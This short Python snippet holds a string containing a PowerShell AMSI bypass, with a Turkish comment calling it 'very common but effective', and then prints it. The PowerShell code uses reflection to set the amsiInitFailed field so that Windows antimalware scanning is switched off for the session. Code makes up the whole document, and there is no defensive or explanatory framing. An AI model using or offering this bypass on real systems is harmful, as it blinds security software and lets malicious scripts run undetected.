x = """
# AMSI patch (çok yaygın ama etkili)
$A = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$B = $A.GetField('amsiInitFailed','NonPublic,Static')
$B.SetValue($null,$true)
"""
print(x)